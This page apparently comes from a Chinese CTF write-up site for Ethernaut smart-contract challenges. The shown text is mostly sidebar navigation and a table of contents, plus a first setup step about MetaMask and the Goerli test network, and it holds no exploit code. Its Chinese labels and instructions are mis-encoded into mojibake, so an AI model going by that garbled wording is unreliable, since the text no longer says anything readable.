    <li class="md-nav__item">
      <a href="../../crypto/steroid_stream/" class="md-nav__link">
        Steroid Stream
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easyxor/" class="md-nav__link">
        easyxor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/ustc_easy_rsa/" class="md-nav__link">
        HackerGame - Easy RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/baby_mac/" class="md-nav__link">
        Baby MAC
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/noteasy03/" class="md-nav__link">
        noteasy03
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/dealymaffs/" class="md-nav__link">
        Dealymaffs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/weird_programmer/" class="md-nav__link">
        Weird Programmer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/x_factor/" class="md-nav__link">
        X Factor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/paiaiai/" class="md-nav__link">
        P(ai)^3
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/casino/" class="md-nav__link">
        Casino
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/black_hole/" class="md-nav__link">
        Black Hole
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/diophantine/" class="md-nav__link">
        Diophantine
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_25" type="checkbox" id="__nav_6_25" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_25">
          Google CTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Google CTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_25">
          <span class="md-nav__icon md-icon"></span>
          Google CTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/cycling/" class="md-nav__link">
        Cycling
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/maybe_someday/" class="md-nav__link">
        Maybe Someday
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/dynamic_rsa/" class="md-nav__link">
        Dynamic RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_27" type="checkbox" id="__nav_6_27" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_27">
          corCTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="corCTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_27">
          <span class="md-nav__icon md-icon"></span>
          corCTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/exchanged/" class="md-nav__link">
        exchanged
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/leapfrog/" class="md-nav__link">
        leapfrog
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/shuffle128/" class="md-nav__link">
        shuffle128
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7">
          Blockchain
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Blockchain" data-md-level="1">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          Blockchain
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/code_is_law/" class="md-nav__link">
        Code is Law
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/totally_secure_dapp/" class="md-nav__link">
        Totally Secure Dapp
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/cairo_reverse/" class="md-nav__link">
        Cairo Reverse
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tctf_nft_market/" class="md-nav__link">
        TCTF NFT Market
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_5">
          DownUnderCTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="DownUnderCTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_5">
          <span class="md-nav__icon md-icon"></span>
          DownUnderCTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/secret_and_ephemeral/" class="md-nav__link">
        Secret and Ephemeral
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/private_log/" class="md-nav__link">
        Private Log
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/memory_master_on_the_chain/" class="md-nav__link">
        Èìæ‰∏äËÆ∞ÂøÜÂ§ßÂ∏à
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/cookie_market/" class="md-nav__link">
        Cookie Market
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tetctftoken/" class="md-nav__link">
        TetCTFToken
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/realwrap/" class="md-nav__link">
        realwrap
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/evmvm/" class="md-nav__link">
        evmvm
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_11" type="checkbox" id="__nav_7_11" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_11">
          HackTM CTF 2023
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackTM CTF 2023" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_11">
          <span class="md-nav__icon md-icon"></span>
          HackTM CTF 2023
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/dragon_slayer/" class="md-nav__link">
        Dragon Slayer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/diamond_heist/" class="md-nav__link">
        Diamond Heist
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_8">
          Wargames
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Wargames" data-md-level="1">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          Wargames
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../natas/" class="md-nav__link">
        Natas
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../leviathan/" class="md-nav__link">
        Leviathan
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../krypton/" class="md-nav__link">
        Krypton
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../narnia/" class="md-nav__link">
        Narnia
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_5" type="checkbox" id="__nav_8_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_5">
          Protostar
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Protostar" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_5">
          <span class="md-nav__icon md-icon"></span>
          Protostar
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/stack/" class="md-nav__link">
        Stack
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/format/" class="md-nav__link">
        Format
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/heap/" class="md-nav__link">
        Heap
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/net/" class="md-nav__link">
        Net
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/final/" class="md-nav__link">
        Final
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Ethernaut
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Ethernaut
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="ÁõÆÂΩï">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      ÁõÆÂΩï
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#0-hello-ethernaut" class="md-nav__link">
    0. Hello Ethernaut
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-fallback" class="md-nav__link">
    1. Fallback
  </a>
  
    <nav class="md-nav" aria-label="1. Fallback">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-fallout" class="md-nav__link">
    2. Fallout
  </a>
  
    <nav class="md-nav" aria-label="2. Fallout">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-coin-flip" class="md-nav__link">
    3. Coin Flip
  </a>
  
    <nav class="md-nav" aria-label="3. Coin Flip">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-telephone" class="md-nav__link">
    4. Telephone
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-token" class="md-nav__link">
    5. Token
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-delegation" class="md-nav__link">
    6. Delegation
  </a>
  
    <nav class="md-nav" aria-label="6. Delegation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-force" class="md-nav__link">
    7. Force
  </a>
  
    <nav class="md-nav" aria-label="7. Force">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-vault" class="md-nav__link">
    8. Vault
  </a>
  
    <nav class="md-nav" aria-label="8. Vault">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-king" class="md-nav__link">
    9. King
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#10-re-entrancy" class="md-nav__link">
    10. Re-entrancy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#11-elevator" class="md-nav__link">
    11. Elevator
  </a>
  
    <nav class="md-nav" aria-label="11. Elevator">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#12-privacy" class="md-nav__link">
    12. Privacy
  </a>
  
    <nav class="md-nav" aria-label="12. Privacy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#13-gatekeeper-one" class="md-nav__link">
    13. Gatekeeper One
  </a>
  
    <nav class="md-nav" aria-label="13. Gatekeeper One">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#14-gatekeeper-two" class="md-nav__link">
    14. Gatekeeper Two
  </a>
  
    <nav class="md-nav" aria-label="14. Gatekeeper Two">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#15-naught-coin" class="md-nav__link">
    15. Naught Coin
  </a>
  
    <nav class="md-nav" aria-label="15. Naught Coin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#16-preservation" class="md-nav__link">
    16. Preservation
  </a>
  
    <nav class="md-nav" aria-label="16. Preservation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#17-recovery" class="md-nav__link">
    17. Recovery
  </a>
  
    <nav class="md-nav" aria-label="17. Recovery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#18-magicnumber" class="md-nav__link">
    18. MagicNumber
  </a>
  
    <nav class="md-nav" aria-label="18. MagicNumber">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#19-alien-codex" class="md-nav__link">
    19. Alien Codex
  </a>
  
    <nav class="md-nav" aria-label="19. Alien Codex">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#20-denial" class="md-nav__link">
    20. Denial
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#21-shop" class="md-nav__link">
    21. Shop
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#22-dex" class="md-nav__link">
    22. Dex
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#23-dex-two" class="md-nav__link">
    23. Dex Two
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#24-puzzle-wallet" class="md-nav__link">
    24. Puzzle Wallet
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#25-motorbike" class="md-nav__link">
    25. Motorbike
  </a>
  
    <nav class="md-nav" aria-label="25. Motorbike">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#26-doubleentrypoint" class="md-nav__link">
    26. DoubleEntryPoint
  </a>
  
    <nav class="md-nav" aria-label="26. DoubleEntryPoint">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../solana_pathway/" class="md-nav__link">
        Solana Pathway
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../solana_security_workshop/" class="md-nav__link">
        Solana Security Workshop
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
      
      
      
      
        <label class="md-nav__link" for="__nav_9">
          ÂΩ©Ëõã
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="ÂΩ©Ëõã" data-md-level="1">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          ÂΩ©Ëõã
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_index/" class="md-nav__link">
        CTFHub - È¶ñÈ°µ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_wechat/" class="md-nav__link">
        CTFHub - ÂÖ¨‰ºóÂè∑
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_tools/" class="md-nav__link">
        CTFHub - Â∑•ÂÖ∑
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_match/" class="md-nav__link">
        CTFHub - Ëµõ‰∫ã
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_exams/" class="md-nav__link">
        CTFHub - ÁúüÈ¢ò
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="ÁõÆÂΩï">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      ÁõÆÂΩï
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#0-hello-ethernaut" class="md-nav__link">
    0. Hello Ethernaut
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-fallback" class="md-nav__link">
    1. Fallback
  </a>
  
    <nav class="md-nav" aria-label="1. Fallback">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-fallout" class="md-nav__link">
    2. Fallout
  </a>
  
    <nav class="md-nav" aria-label="2. Fallout">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-coin-flip" class="md-nav__link">
    3. Coin Flip
  </a>
  
    <nav class="md-nav" aria-label="3. Coin Flip">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-telephone" class="md-nav__link">
    4. Telephone
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-token" class="md-nav__link">
    5. Token
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-delegation" class="md-nav__link">
    6. Delegation
  </a>
  
    <nav class="md-nav" aria-label="6. Delegation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-force" class="md-nav__link">
    7. Force
  </a>
  
    <nav class="md-nav" aria-label="7. Force">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-vault" class="md-nav__link">
    8. Vault
  </a>
  
    <nav class="md-nav" aria-label="8. Vault">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-king" class="md-nav__link">
    9. King
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#10-re-entrancy" class="md-nav__link">
    10. Re-entrancy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#11-elevator" class="md-nav__link">
    11. Elevator
  </a>
  
    <nav class="md-nav" aria-label="11. Elevator">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#12-privacy" class="md-nav__link">
    12. Privacy
  </a>
  
    <nav class="md-nav" aria-label="12. Privacy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#13-gatekeeper-one" class="md-nav__link">
    13. Gatekeeper One
  </a>
  
    <nav class="md-nav" aria-label="13. Gatekeeper One">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#14-gatekeeper-two" class="md-nav__link">
    14. Gatekeeper Two
  </a>
  
    <nav class="md-nav" aria-label="14. Gatekeeper Two">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#15-naught-coin" class="md-nav__link">
    15. Naught Coin
  </a>
  
    <nav class="md-nav" aria-label="15. Naught Coin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#16-preservation" class="md-nav__link">
    16. Preservation
  </a>
  
    <nav class="md-nav" aria-label="16. Preservation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#17-recovery" class="md-nav__link">
    17. Recovery
  </a>
  
    <nav class="md-nav" aria-label="17. Recovery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#18-magicnumber" class="md-nav__link">
    18. MagicNumber
  </a>
  
    <nav class="md-nav" aria-label="18. MagicNumber">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#19-alien-codex" class="md-nav__link">
    19. Alien Codex
  </a>
  
    <nav class="md-nav" aria-label="19. Alien Codex">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#20-denial" class="md-nav__link">
    20. Denial
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#21-shop" class="md-nav__link">
    21. Shop
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#22-dex" class="md-nav__link">
    22. Dex
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#23-dex-two" class="md-nav__link">
    23. Dex Two
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#24-puzzle-wallet" class="md-nav__link">
    24. Puzzle Wallet
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#25-motorbike" class="md-nav__link">
    25. Motorbike
  </a>
  
    <nav class="md-nav" aria-label="25. Motorbike">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#26-doubleentrypoint" class="md-nav__link">
    26. DoubleEntryPoint
  </a>
  
    <nav class="md-nav" aria-label="26. DoubleEntryPoint">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
  

  
                
  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/ethernaut.md" title="ÁºñËæëÊ≠§È°µ" class="md-content__button md-icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
  </a>



  <h1>Ethernaut</h1>

<div class="blogging-tags-grid">

        <a href="#blockchain" class="blogging-tag"><code>#blockchain</code></a>

        <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>

        <a href="#solidity" class="blogging-tag"><code>#solidity</code></a>

    </div>

<style>
    .md-typeset .blogging-tags-grid {
        display: flex;
        flex-direction: row;
        flex-wrap: wrap;
        gap: 8px;
        margin-top: 5px;
    }

    .md-typeset .blogging-tag {
        color: var(--md-typeset-color);
        background-color: var(--md-typeset-code-color);
    }

    .md-typeset .blogging-tag code {
        border-radius: 5px;
    }
</style>
<h2 id="0-hello-ethernaut">0. Hello Ethernaut<a class="headerlink" href="#0-hello-ethernaut" title="Permanent link">&para;</a></h2>
<ul>
<li>ÁôªÂΩï MetaMaskÔºåÂ∞Ü MetaMask ÂàáÊç¢Âà∞ Goerli ÊµãËØïÁΩëÁªú<ul>
<li>Ëã•Ê≤°ÊúâÂàôÈúÄË¶ÅÂú® <code>ËÆæÁΩÆ-&gt;È´òÁ∫ß</code> ‰∏≠ÂºÄÂêØ„ÄåShow test networks„Äç</li>
</ul>
</li>
